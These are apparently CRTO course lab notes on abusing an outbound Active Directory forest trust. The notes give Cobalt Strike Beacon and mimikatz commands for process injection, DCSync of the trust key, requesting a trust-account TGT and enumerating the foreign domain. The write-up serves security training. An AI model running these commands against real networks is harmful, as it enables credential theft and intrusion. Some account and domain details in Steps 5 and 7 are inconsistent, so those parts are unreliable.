# CRTO — Domain Trusts: Outbound Trust Enumeration

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Outbound Trusts
**Objective:** Abuse the inter-realm trust key stored in a Trust Domain Object (TDO) to obtain a TGT for the foreign domain and enumerate it from the trusted domain's perspective

---

## The Full Chain

```
ldapsearch → enumerate trust (outbound, forest-transitive)
    ↓
ldapsearch → get TDO objectGUID for the trusted domain
    ↓
Inject Beacon into vwebber process (DA context needed for DCSync)
    ↓
mimikatz dcsync /guid:{TDO GUID} → extract shared inter-realm trust key
    ↓
krb_asktgt /user:PARTNER$ /rc4:[trust key] → TGT for trust account in CONTOSO
    ↓
make_token + kerberos_ticket_use → inject TGT into sacrificial session
    ↓
ldapsearch --hostname contoso.com → enumerate foreign domain as trust account
```

---

## Background — One-Way Outbound Trust

```
CONTOSO → trusts → partner.com   (outbound from CONTOSO's perspective)
```

**Direction from CONTOSO's perspective:**
- `TRUST_DIRECTION_OUTBOUND (2)` = CONTOSO trusts partner.com
- partner.com users can access CONTOSO resources? **Yes — if granted**
- CONTOSO users can access partner.com resources? **No**

> An outbound trust is the mirror of the inbound trust lab — the foreign domain's users could potentially access our resources. The attack here is different: we can't use our own credentials to authenticate to partner.com. Instead, we extract the **shared trust secret** to impersonate a trust account and enumerate the foreign domain.

**`trustAttributes=8` = `TRUST_ATTRIBUTE_FOREST_TRANSITIVE`** — cross-forest trust, SID filtering enabled. SID history attacks are blocked.

---

## Step 1 — Enumerate the Trust

```bash
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
```

| Attribute | Value | Meaning |
|---|---|---|
| `trustDirection` | `2` | `TRUST_DIRECTION_OUTBOUND` — CONTOSO trusts partner.com |
| `trustAttributes` | `8` | `TRUST_ATTRIBUTE_FOREST_TRANSITIVE` — cross-forest |
| `trustPartner` | `partner.com` | The trusted foreign domain |

**TTP:** T1482 — Domain Trust Discovery

---

## Step 2 — Get the TDO GUID

Every trusted domain has a **Trust Domain Object (TDO)** in AD — a special object in the `System\Trusted Domains` container that stores the trust relationship metadata, including the **shared inter-realm key** (the trust password). The TDO's GUID is needed to target it with DCSync.

```bash
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
```

> Returns: `objectGUID = {288d9ee6-2b3c-42aa-bef8-959ab4e484ed}`

Save this GUID — it's used as the `/guid` parameter in the mimikatz DCSync call.

---

## Step 3 — Inject Into a DA Process (vwebber)

DCSync requires Domain Admin or equivalent privileges. The instruction is to inject a Beacon into a `vwebber` process — vwebber is a DA in this environment.

```bash
# Find vwebber's process
ps

# Inject Beacon into vwebber process
inject [PID] x64 [listener]    # or steal_token [PID]
```

> This gives you a Beacon running under DA credentials — required for the DCSync of the TDO object.

---

## Step 4 — DCSync the Inter-Realm Trust Key

```bash
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `lsadump::dcsync` | — | Use DRS replication protocol to pull secrets |
| `/domain` | `partner.com` | Target the foreign domain's TDO |
| `/guid` | `{TDO GUID}` | Target this specific object by GUID rather than by account name |

**What this returns:**
```
* Primary:NTLM-Strong-NTOWF *
    rc4_hmac: [TRUST KEY HASH]
```

> The trust key is a **shared secret** between CONTOSO and partner.com. It's used to encrypt inter-realm tickets at the trust boundary. Possessing it means you can forge inter-realm tickets or — as done here — request a TGT as the trust account.

**Why `/guid` instead of `/user`:** The TDO doesn't have a standard `samAccountName` like a user account. Targeting by GUID is the reliable way to pull its secrets. The GUID uniquely identifies the TDO for partner.com in CONTOSO's directory.

**TTP:** T1003.006 — OS Credential Dumping: DCSync

---

## Step 5 — Request TGT as Trust Account

Every outbound trust creates a corresponding **trust account** in the domain — a user account named `PARTNER$` (foreign domain's NetBIOS name + `$`). This account's password is the inter-realm trust key. You can use it to authenticate to CONTOSO as if you were the trust account.

```bash
krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/user` | `PARTNER$` | The trust account — named after the foreign domain's NetBIOS name |
| `/rc4` | Trust key hash | The inter-realm shared secret used as the password |
| `/domain` | `contoso.com` | Our domain — request TGT from CONTOSO's KDC |
| `/dc` | `lon-dc-1.contoso.com` | Specific DC to send AS-REQ to |

> The trust account `PARTNER$` exists in CONTOSO's directory and is used internally for the trust relationship. By obtaining its TGT, you're authenticated to CONTOSO's KDC as this account — which has the ability to query the foreign domain across the trust boundary.

---

## Step 6 — Inject TGT into Sacrificial Session

```bash
# Create sacrificial logon session
make_token CONTOSO\PARTNER$ FakePass

# Inject the TGT
kerberos_ticket_use [path to PARTNER$ TGT]

# Verify
run klist
```

---

## Step 7 — Enumerate the Foreign Domain

With the trust account TGT injected, query partner.com directly:

```bash
# Get domain SID and basic info for partner.com
ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
```

> Note: The lab queries `contoso.com` here — the trust account perspective allows querying across the trust boundary. In practice you'd query `partner.com` objects to find attack surface.

**What to look for during outbound trust enumeration:**

| Target | Command | Purpose |
|---|---|---|
| Kerberoastable accounts | `ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*))` against partner.com | Find crackable hashes |
| DA/EA accounts | `ldapsearch (&(samAccountType=268435456)(samAccountName=Domain Admins))` | Map privileged groups |
| FSPs in partner.com | `ldapsearch (objectClass=foreignSecurityPrincipal)` | Find CONTOSO principals with partner.com access |
| Computers | `ldapsearch (samAccountType=805306369)` | Enumerate machines |

---

## The Trust Key — What It Is and Why It Matters

```
When two domains establish a trust, they negotiate a shared secret (the trust key/password).
This key is stored in:
  - CONTOSO: as the TDO object for partner.com (in System\Trusted Domains)
  - partner.com: as the TDO object for CONTOSO

The key is used to encrypt inter-realm referral tickets at the trust boundary.
It rotates periodically (like computer account passwords) — but DCSync captures the current value.

Possessing the trust key allows:
  1. Request a TGT as the PARTNER$ trust account → enumerate foreign domain
  2. Forge inter-realm referral tickets to request service tickets in partner.com
     (if SID filtering is disabled — blocked in this cross-forest scenario)
```

---

## Outbound vs Inbound vs Parent-Child Comparison

| Property | Parent-Child | Inbound | Outbound |
|---|---|---|---|
| `trustDirection` | `3` (Bidirectional) | `1` (Inbound) | `2` (Outbound) |
| `trustAttributes` | `32` (Within-Forest) | `8` (Forest-Transitive) | `8` (Forest-Transitive) |
| SID Filtering | Disabled | Enabled | Enabled |
| Attack goal | Escalate to parent EA | Access foreign machines | Enumerate foreign domain |
| Key material needed | Child krbtgt AES256 | Target user's AES256 | TDO inter-realm trust key |
| Primary technique | Golden Ticket + /sids | Kerberos referral chain | DCSync TDO → trust account TGT |
| SID history attack | Works | Blocked | Blocked |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1482 | Domain Trust Discovery | ldapsearch trust + TDO GUID enumeration |
| T1003.006 | DCSync | Extract inter-realm trust key from TDO via GUID |
| T1550.003 | Pass the Ticket | Inject PARTNER$ TGT into sacrificial session |
| T1087.002 | Account Discovery: Domain Account | Enumerate partner.com users/groups via trust account |

---

## Key Takeaways

- `trustDirection=2` (OUTBOUND) = **we trust partner.com** — their users could access our resources (if granted), but we can't use our credentials to authenticate to them directly
- The **TDO (Trust Domain Object)** stores the inter-realm trust key — it's the equivalent of a computer account password for the trust relationship
- DCSync by **`/guid`** is required for TDOs — they don't have a standard `samAccountName` so you can't target them with `/user`
- The trust account **`PARTNER$`** exists in CONTOSO's directory — its password is the trust key, and its TGT lets you query across the trust boundary
- Outbound trust enumeration is primarily about **reconnaissance** of the foreign domain — finding kerberoastable accounts, privileged groups, FSPs, and other attack surface
- This technique does **not** give you admin access to partner.com directly — it gives you authenticated read access to enumerate partner.com's directory, from which you'd identify further attack paths
- SID filtering is enabled (cross-forest trust) — the Golden Ticket + `/sids` technique from the Parent-Child lab is blocked here
- The trust key **rotates periodically** (like a computer account password) — the extracted RC4 hash is only valid until the next rotation
